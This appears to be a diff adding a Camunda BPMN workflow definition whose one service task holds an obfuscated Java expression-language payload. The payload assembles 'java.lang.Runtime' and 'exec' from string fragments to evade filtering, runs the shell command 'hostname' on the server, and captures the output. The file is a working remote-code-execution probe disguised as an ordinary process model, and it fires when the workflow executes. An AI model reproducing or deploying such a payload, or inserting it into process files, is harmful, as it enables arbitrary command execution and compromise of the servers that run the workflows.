@@ -1,0 +1,12 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<definitions xmlns="http://www.omg.org/spec/BPMN/20100524/MODEL"
+             xmlns:camunda="http://camunda.org/schema/1.0/bpmn"
+             id="D1" targetNamespace="x">
+  <process id="x1_1779505439" isExecutable="true">
+    <startEvent id="s"/>
+    <serviceTask id="t" camunda:expression="${''.getClass().getConstructor(''.getClass().forName('[B')).newInstance(''.getClass().forName('java'.concat('.lang.Ru').concat('ntime')).getMethod('ex'.concat('ec'), ''.getClass()).invoke(''.getClass().forName('java'.concat('.lang.Ru').concat('ntime')).getMethod('get'.concat('Runtime')).invoke(null), 'hostname').getInputStream().readAllBytes())}" camunda:resultVariable="o"/>
+    <endEvent id="e"/>
+    <sequenceFlow id="f1" sourceRef="s" targetRef="t"/>
+    <sequenceFlow id="f2" sourceRef="t" targetRef="e"/>
+  </process>
+</definitions>
